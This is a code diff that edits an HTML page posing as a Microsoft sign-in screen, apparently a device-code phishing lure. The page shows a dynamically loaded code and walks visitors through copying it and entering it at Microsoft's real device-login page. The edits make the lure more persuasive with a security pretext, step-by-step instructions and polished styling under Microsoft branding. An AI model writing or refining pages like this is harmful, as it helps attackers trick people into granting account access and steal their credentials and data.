@@ -10,8 +10,10 @@
         .login-box { background: #fff; width: 100%; max-width: 440px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); box-sizing: border-box; }
         .logo { width: 108px; margin-bottom: 24px; display: block; }
         h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 0 0 12px 0; }
-        p { font-size: 15px; line-height: 20px; color: #1b1b1b; margin-bottom: 20px; }
-        .code-container { background-color: #f3f3f3; border: 1px dashed #0067b8; padding: 20px; text-align: center; margin-bottom: 25px; cursor: pointer; }
+        p { font-size: 15px; line-height: 20px; color: #1b1b1b; margin-bottom: 16px; }
+        .instruction-step { font-size: 13px; color: #666; margin-bottom: 20px; padding-left: 10px; border-left: 2px solid #0067b8; }
+        .code-container { background-color: #f3f3f3; border: 1px dashed #0067b8; padding: 20px; text-align: center; margin-bottom: 25px; cursor: pointer; transition: background 0.2s; }
+        .code-container:hover { background-color: #e6e6e6; }
         #code-display { font-family: 'Consolas', monospace; font-size: 32px; font-weight: 700; letter-spacing: 4px; color: #0067b8; margin: 0; }
         .copy-hint { font-size: 11px; color: #666; margin-top: 8px; text-transform: uppercase; }
         .btn-primary { display: block; width: 100%; background-color: #0067b8; color: #fff; border: none; padding: 10px; font-size: 15px; text-align: center; text-decoration: none; cursor: pointer; box-sizing: border-box; }
@@ -26,15 +28,21 @@
     <div class="login-box">
         <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageMedia/RE1Mu3b?ver=5c31" class="logo" alt="Microsoft">
         
-        <h1>Action Required</h1>
-        <p>To continue to your account, please verify this device by entering the code below.</p>
+        <h1>Connect device</h1>
+        <p>To keep your account secure, we need to verify this session. Follow these steps:</p>
+        
+        <div class="instruction-step">
+            1. Click the code below to copy it.<br>
+            2. Click "Click to Authenticate" to open the Microsoft portal.<br>
+            3. Paste the code and sign in to complete verification.
+        </div>
 
         <div class="code-container" onclick="window.copyToClipboard()">
             <p id="code-display">Loading...</p>
             <div class="copy-hint" id="status-hint">Click code to copy</div>
         </div>
 
-        <a href="https://microsoft.com/devicelogin" target="_blank" class="btn-primary">Click to Authenticate</a>
+        <a href="https://www.microsoft.com/link" target="_blank" class="btn-primary">Click to Authenticate</a>
 
         <div style="margin-top:40px; font-size:12px; color:#666;">
             <a href="#" style="color:#0067b8; text-decoration:none; margin-right:10px;">Privacy & cookies</a>
